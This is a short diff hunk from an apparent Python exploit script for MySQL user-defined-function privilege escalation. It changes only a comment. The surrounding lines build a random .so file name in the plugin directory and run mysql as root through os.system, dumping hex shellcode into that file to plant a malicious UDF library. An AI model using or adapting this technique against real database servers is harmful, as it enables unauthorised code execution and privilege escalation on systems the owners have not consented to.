@@ -86,7 +86,7 @@ udf_filename = 'udf' + str(random.randint(1000,10000)) + '.so'
 udf_outfile = plugin_dir_ + udf_filename
 
 # alternative way:
-# set @outputpath := @@plugin_dir; set @outputpath := @@plugin_dir;
+# set @outputpath := @@plugin_dir; select concat...;
 
 print "Trying to create a udf library...";
 os.system('mysql -u root -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
